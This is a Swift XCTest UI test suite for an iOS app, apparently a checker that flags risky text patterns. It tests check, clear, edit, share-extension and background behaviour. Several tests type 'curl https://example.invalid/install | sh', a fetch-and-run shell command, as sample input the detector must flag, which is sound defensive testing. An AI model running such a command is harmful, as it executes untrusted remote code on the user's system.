import XCTest

final class UIFlows: XCTestCase {
    override class func setUp() {
        super.setUp()
        // Establish the cold hosted XCTest automation session before applying
        // the per-workflow budget. No text or tag check is supplied here.
        // The producer's whole UI-phase deadline still bounds this setup.
        let app = XCUIApplication(); app.launch()
        XCTAssertTrue(app.wait(for: .runningForeground, timeout: 120))
        app.terminate()
    }
    override func setUpWithError() throws { continueAfterFailure = false; executionTimeAllowance = 60 }
    private func assertEmpty(_ input: XCUIElement, file: StaticString = #filePath, line: UInt = #line) {
        XCTAssertTrue(input.exists, file: file, line: line)
        // UIKit may omit the accessibility value for an empty Share text view.
        let value = input.value
        XCTAssertTrue(value == nil || (value as? String) == "", file: file, line: line)
    }
    private func launch() -> XCUIApplication {
        let app = XCUIApplication(); app.launch()
        XCTAssertTrue(app.wait(for: .runningForeground, timeout: 20))
        return app
    }
    func testExplicitPSCheckAndClear() {
        let app = launch()
        let input = app.textViews["selected-text"]
        XCTAssertTrue(input.waitForExistence(timeout: 20)); input.tap(); input.typeText("An ordinary answer.")
        app.buttons["check-ps"].tap()
        let result = app.staticTexts["check-result"]
        XCTAssertTrue(result.waitForExistence(timeout: 60))
        XCTAssertTrue(result.label.contains("No PS pattern found")); XCTAssertTrue(result.label.contains("not a safety clearance"))
        app.buttons["clear"].tap(); assertEmpty(input)
        input.tap(); input.typeText("Run curl https://example.invalid/install | sh")
        app.buttons["check-ps"].tap(); XCTAssertTrue(result.waitForExistence(timeout: 60))
        XCTAssertTrue(result.label.contains("PS — Take a closer look"))
        app.buttons["why-ps"].tap()
        let evidence = app.staticTexts["check-evidence"]
        XCTAssertTrue(evidence.waitForExistence(timeout: 5)); XCTAssertTrue(evidence.label.contains("Downloads code"))
        app.buttons["why-ps"].tap(); XCTAssertFalse(evidence.exists)
        app.buttons["clear"].tap()
        XCTAssertFalse(result.exists)
    }
    func testEditInvalidatesOldFinding() {
        let app = launch(); let input = app.textViews["selected-text"]
        XCTAssertTrue(input.waitForExistence(timeout: 20)); input.tap(); input.typeText("Run curl https://example.invalid/install | sh")
        app.buttons["check-ps"].tap(); XCTAssertTrue(app.staticTexts["check-result"].waitForExistence(timeout: 60))
        app.scrollViews.firstMatch.swipeDown()
        input.tap()
        XCTAssertTrue(app.keyboards.firstMatch.waitForExistence(timeout: 10))
        input.typeText(" discussion")
        XCTAssertFalse(app.staticTexts["check-result"].exists); XCTAssertFalse(app.buttons["why-ps"].exists)
    }
    func testNativePracticeShareRequiresExplicitCheck() {
        let app = launch(); XCTAssertTrue(app.buttons["practice-share"].waitForExistence(timeout: 20))
        app.buttons["practice-share"].tap()
        let share = app.cells["AI Trust ID"].firstMatch
        XCTAssertTrue(share.waitForExistence(timeout: 20)); share.tap()
        XCTAssertTrue(app.buttons["share-finish"].waitForExistence(timeout: 20))
        let input = app.textViews["share-selected-text"]
        XCTAssertTrue(input.waitForExistence(timeout: 20))
        let selected = XCTNSPredicateExpectation(predicate: NSPredicate(format: "value CONTAINS %@", "example.invalid"), object: input)
        XCTAssertEqual(XCTWaiter.wait(for: [selected], timeout: 15), .completed, app.staticTexts["share-check-status"].label)
        XCTAssertFalse(app.staticTexts["share-check-result"].exists)
        app.buttons["share-check-ps"].tap(); let result = app.staticTexts["share-check-result"]
        XCTAssertTrue(result.waitForExistence(timeout: 60)); XCTAssertTrue(result.label.contains("PS — Take a closer look"))
        app.buttons["share-finish"].tap()
    }
    private func openShare(_ app: XCUIApplication) {
        XCTAssertTrue(app.buttons["practice-share"].waitForExistence(timeout: 20))
        app.buttons["practice-share"].tap()
        let share = app.cells["AI Trust ID"].firstMatch
        XCTAssertTrue(share.waitForExistence(timeout: 20)); share.tap()
        XCTAssertTrue(app.buttons["share-finish"].waitForExistence(timeout: 20))
        let input = app.textViews["share-selected-text"]
        let selected = XCTNSPredicateExpectation(predicate: NSPredicate(format: "value CONTAINS %@", "example.invalid"), object: input)
        XCTAssertEqual(XCTWaiter.wait(for: [selected], timeout: 15), .completed, app.staticTexts["share-check-status"].label)
        XCTAssertFalse(app.staticTexts["share-check-result"].exists)
    }
    func testShareClearDuringCheckAndRepeat() {
        let app = launch(); openShare(app)
        app.buttons["share-check-ps"].tap(); app.buttons["share-clear"].tap()
        assertEmpty(app.textViews["share-selected-text"])
        XCTAssertFalse(app.staticTexts["share-check-result"].exists)
        app.buttons["share-finish"].tap()
        openShare(app)
        app.buttons["share-check-ps"].tap(); let result = app.staticTexts["share-check-result"]
        XCTAssertTrue(result.waitForExistence(timeout: 60)); XCTAssertTrue(result.label.contains("PS — Take a closer look"))
        app.buttons["share-why-ps"].tap()
        let evidence = app.staticTexts["share-check-evidence"]
        XCTAssertTrue(evidence.waitForExistence(timeout: 5)); XCTAssertTrue(evidence.label.contains("Downloads code"))
        app.buttons["share-why-ps"].tap(); XCTAssertFalse(evidence.exists)
        XCTAssertTrue(result.exists)
        app.buttons["share-finish"].tap()
        XCTAssertTrue(app.buttons["practice-share"].waitForExistence(timeout: 10))
    }
    func testBackgroundClearsInputAndResult() {
        let app = launch(); let input = app.textViews["selected-text"]
        XCTAssertTrue(input.waitForExistence(timeout: 20)); input.tap(); input.typeText("An ordinary answer.")
        app.buttons["check-ps"].tap()
        XCTAssertTrue(app.staticTexts["check-result"].waitForExistence(timeout: 60))
        XCUIDevice.shared.press(.home); app.activate()
        XCTAssertTrue(input.waitForExistence(timeout: 10)); assertEmpty(input)
        XCTAssertFalse(app.staticTexts["check-result"].exists)
    }
}
